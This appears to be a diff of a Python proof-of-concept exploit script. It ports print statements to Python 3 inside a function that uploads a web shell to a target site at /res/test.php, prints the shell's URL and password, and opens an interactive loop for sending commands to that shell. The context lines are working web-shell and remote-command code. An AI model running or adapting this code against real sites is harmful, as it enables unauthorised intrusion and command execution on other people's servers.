@@ -30,8 +30,8 @@ def poc():
 		r = requests.post(url2, files=files2, cookies=cookies)
 
 		shell = target.url.replace("/index.php","/res/test.php")
-		print "[*] The shell url: " + shell
-		print "[*] The shell password: " + password
+		print("[*] The shell url: " + shell)
+		print("[*] The shell password: " + password)
 
 		while 1:
 			try:
@@ -42,11 +42,11 @@ def poc():
 						password : payload
 					}
 					r = requests.post(shell, data=postdata)
-					print r.text.encode(r.encoding)
+					print(r.text.encode(r.encoding))
 				else:
 					break
 			except EOFError as e:
-				print "[*] type 'exit' to quit"
+				print("[*] type 'exit' to quit")
 				pass
 
 		print("\033[33m[*] Complete this task: {} \033[0m".format(target.url))
